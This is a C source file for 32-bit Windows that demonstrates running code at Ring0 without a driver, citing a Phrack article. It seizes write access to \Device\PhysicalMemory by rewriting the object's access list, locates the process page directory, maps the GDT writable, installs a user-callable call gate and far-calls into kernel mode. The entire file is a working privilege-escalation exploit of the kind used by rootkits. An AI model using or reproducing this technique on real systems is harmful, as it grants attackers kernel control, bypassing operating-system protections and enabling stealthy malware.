// Execute Ring0 code WITHOUT driver.
//
// references:
//  http://www.nah6.com/~itsme/cvs-xdadevtools/itsutils/src/sysint-physmem.cpp
//  http://www.phrack.com/issues.html?issue=59&id=10
//

#include "ring0.h"

struct x86_CallGateDescriptor
{
   WORD offset_low;
   WORD selector;
   BYTE param_count :5;
   BYTE unused :3;
   BYTE type :5;
   BYTE dpl :2;
   BYTE present :1;
   WORD offset_high;
} ;

// Forward declaration ntdll.dll functions
typedef NTSTATUS (__stdcall* fNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG, ULONG, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
typedef NTSTATUS (__stdcall* fNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (__stdcall* fNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (__stdcall* fNtClose)(HANDLE Handle);

// ntdll.dll functions
static fNtMapViewOfSection NtMapViewOfSection;
static fNtUnmapViewOfSection NtUnmapViewOfSection;
static fNtOpenSection NtOpenSection;
static fNtClose NtClose;

// function used for the demo
void function_ring0(DWORD u,DWORD i)
{
  _asm
  {
    // clean up stack & return
    mov eax, 0
    mov ax, cs // put cs in ax
    mov esp,ebp
    pop ebp
    retf 4
  }
} 

static void die(const char* errmsg)
{
  printf("%s\n", errmsg);
  ExitProcess(1);
}

// Global handle to \Device\PhysicalMemory
static HANDLE phyMemoryHandle; 

static bool OpenPhysicalMemory(void)
{
  // Grant me to access to physical memory
  EXPLICIT_ACCESS Access;
  PACL OldDacl = NULL, NewDacl = NULL;
  PVOID security;
  INIT_UNICODE_STRING(name, L"\\Device\\PhysicalMemory");
  OBJECT_ATTRIBUTES oa = {sizeof(oa), 0, &name, 0, 0, 0};  
  memset(&Access, 0, sizeof(EXPLICIT_ACCESS));
  NtOpenSection(&phyMemoryHandle, WRITE_DAC | READ_CONTROL, &oa);
  GetSecurityInfo(phyMemoryHandle, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &OldDacl, NULL, &security);
  Access.grfAccessPermissions = SECTION_ALL_ACCESS; 
  Access.grfAccessMode = GRANT_ACCESS;
  Access.grfInheritance = NO_INHERITANCE;
  Access.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
  Access.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
  Access.Trustee.TrusteeType = TRUSTEE_IS_USER;
  Access.Trustee.ptstrName = "CURRENT_USER";
  // update ACL
  SetEntriesInAcl(1, &Access, OldDacl, &NewDacl);
  SetSecurityInfo(phyMemoryHandle, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, NewDacl, NULL);
  CloseHandle(phyMemoryHandle);
  // get handle to RAM
  if (NtOpenSection(&phyMemoryHandle,SECTION_MAP_READ|SECTION_MAP_WRITE,&oa)) die("NtOpenphyMemoryHandle failed");

  return true;
}

static bool ClosePhysicalMemory(void)
{
  (void) CloseHandle(phyMemoryHandle);

  return true;
}

// Return a 4096 page mapped, 
// should call NtUnmapViewOfphyMemoryHandle to relase it after usage
static void* GetOurPageDirectory(void)
{
  // Get physical memory size
  MEMORYSTATUS meminfo;
  GlobalMemoryStatus(&meminfo);
  // Browse physical memory to find the page directory of our process
  //  @ Page directory of our process is mapped at the virtual address 0xC0300000
  //  @ 0x300 entry of any page directory holds the physical address of the page directory itself
  //  @ Any page directory is also a page table that corresponds to the virtual address of a page directory itself
  bool found = 0;
  for(SIZE_T curPADDR = 0; curPADDR < meminfo.dwTotalPhys; curPADDR += 0x1000)
  {
    // Map current physical page in our address space
    SIZE_T mappedSize = 4096;
    LARGE_INTEGER paddr;
    paddr.QuadPart = curPADDR;
    void* directoryMappedAddress = NULL;
    if (NtMapViewOfSection(phyMemoryHandle, (HANDLE)-1, &directoryMappedAddress, 0L, mappedSize, &paddr, &mappedSize, ViewShare, 0, PAGE_READONLY))
      continue; // Failed continue
    unsigned* entry = (unsigned*)directoryMappedAddress;
    // Calc offsets
    unsigned directoryOffset = ((unsigned)directoryMappedAddress) >> 22;
    unsigned tableOffset = (((unsigned)directoryMappedAddress) >> 12) & 0x3ff;
    // Check if this page is a page directory
    // 0x300 enty : @ 20 up bits must be equal to curPADDR (it holds itself)
    //              @ present bit must be set to one
    //              @ present bie must be set for the page table
    if ((entry[0x300] & 0xfffff000)!= curPADDR ||(entry[0x300] & 1)!= 1 || (entry[directoryOffset] & 1)!= 1)
    {
      // It's not a page directory
      NtUnmapViewOfSection((HANDLE)-1, directoryMappedAddress);
      continue;
    }
    // It's a page directory, check the page table
    mappedSize = 4096;
    paddr.QuadPart = (entry[directoryOffset] & 0xfffff000);
    void* tableMappedAddress = NULL;
    if(NtMapViewOfSection(phyMemoryHandle, (HANDLE)-1, &tableMappedAddress, 0L, mappedSize, &paddr, &mappedSize, ViewShare, 0, PAGE_READONLY))
    {
      NtUnmapViewOfSection((HANDLE)-1, directoryMappedAddress);
      continue;
    }
    entry = (unsigned*)tableMappedAddress;
    if((entry[tableOffset] & 1) == 1 && (entry[tableOffset] & 0xfffff000) == curPADDR)
      found++;
    NtUnmapViewOfSection((HANDLE) -1, tableMappedAddress);
    /*if(found)*/ return directoryMappedAddress; //Directory is found
    NtUnmapViewOfSection((HANDLE) -1, directoryMappedAddress);  
  }

  return NULL;
}

static DWORD GetPhysicalAddrFromVirtualAddr(void* virtualAddr)
{
  // First of all we need our page directory
  void* directoryMapped = GetOurPageDirectory();
  if (!directoryMapped) die("GetOurPageDirectoryAddress failed");
  DWORD vaddr = (DWORD)virtualAddr;
  // Get translation information from the virtual address
  unsigned directoryOffset = vaddr >> 22;
  unsigned tableOffset = (vaddr >> 12) & 0x3ff;
  unsigned* entry = (unsigned*)directoryMapped;
  // Map the page table from translation information
  SIZE_T mappedSize = 4096;
  LARGE_INTEGER paddr;
  paddr.QuadPart = (entry[directoryOffset]&0xfffff000);
  void* tableMappedAddress = NULL;
  if (NtMapViewOfSection(phyMemoryHandle, (HANDLE) -1, &tableMappedAddress, 0L,mappedSize, &paddr, &mappedSize, ViewShare,0, PAGE_READONLY)) die("NtMapViewOfphyMemoryHandle");
  // Get the physical address of the GDT
  // Physical page is in 20 up bits
  entry = (unsigned*)tableMappedAddress;
  DWORD phyGDTBase = (entry[tableOffset] & 0xfffff000);
  //Cleanup
  NtUnmapViewOfSection((HANDLE) -1, tableMappedAddress);
  NtUnmapViewOfSection((HANDLE) -1, directoryMapped);

  return phyGDTBase;
}

void ring0(void)
{
  if (!OpenPhysicalMemory()) die("OpenPhysicalMemory failed");
  // Get the virtual base address of the gdt
  BYTE gdtr[8];
  DWORD gdtbase;
  _asm
  {
    sgdt gdtr
    lea eax,gdtr
    mov ebx,dword ptr[eax+2]
    mov gdtbase,ebx
  }
  // Get the physical address of the gdt
  DWORD phyGDTAddr = GetPhysicalAddrFromVirtualAddr((void*)gdtbase);
  // Map the GDT in our address space
  void* gdtMappedAddress = NULL;
  LARGE_INTEGER paddr;
  paddr.QuadPart = phyGDTAddr;
  SIZE_T mappedSize = 4096;
  NtMapViewOfSection(phyMemoryHandle, (HANDLE)-1, (PVOID*)&gdtMappedAddress, 0L, mappedSize, &paddr, &mappedSize, ViewShare,0, PAGE_READWRITE);
  gdtbase &= 0xfff;
  gdtMappedAddress = ((char*)gdtMappedAddress) + gdtbase;
  x86_CallGateDescriptor* gate = (x86_CallGateDescriptor*) gdtMappedAddress;
  // Find an empty entry in the GDT for our callgate
  unsigned short selector = 1;
  while(1)
  {
    if(!gate[selector].present) break;
    selector++;
  }
  // Setup the callgate
  gate[selector].offset_low = (WORD)((DWORD)function_ring0 & 0xFFFF);
  gate[selector].selector = 8;
  gate[selector].param_count = 1;
  gate[selector].unused = 0;
  gate[selector].type = 0xc; // 32-bit callgate 
  gate[selector].dpl = 3; // Must be 3
  gate[selector].present = 1;
  gate[selector].offset_high = (WORD)((DWORD)function_ring0 >> 16);
  // Cleanup
  NtUnmapViewOfSection((HANDLE) -1, gdtMappedAddress);
  ClosePhysicalMemory();
  // Call kernel code
  WORD farcall[3];
  farcall[2] = (selector << 3); 
  DWORD ret_cs;
  _asm
  {
    mov ebx,0
    push ebx
    call fword ptr [farcall]
    mov ret_cs, eax
  }
  // Ok check CTL in CS register
  printf("CPL=%d\n", ret_cs & 3);
  // Call same code in user
  _asm
  {
    mov eax,0
    mov ax, cs // put cs in ax
    mov ret_cs, eax
  }
  // Ok check CTL in CS register
  printf("CPL=%d\n", ret_cs & 3);
}


int main(int ac, char** av)
{
  // Init ext functions
  NtMapViewOfSection = (fNtMapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"),"NtMapViewOfSection");	
  NtUnmapViewOfSection = (fNtUnmapViewOfSection)GetProcAddress(GetModuleHandle("ntdll.dll"),"NtUnmapViewOfSection");	
  NtOpenSection = (fNtOpenSection)GetProcAddress(GetModuleHandle("ntdll.dll"),"NtOpenSection");	
  NtClose = (fNtClose)GetProcAddress(GetModuleHandle("ntdll.dll"),"NtClose");
  // Call the rest...
  ring0();

  return 0;
}
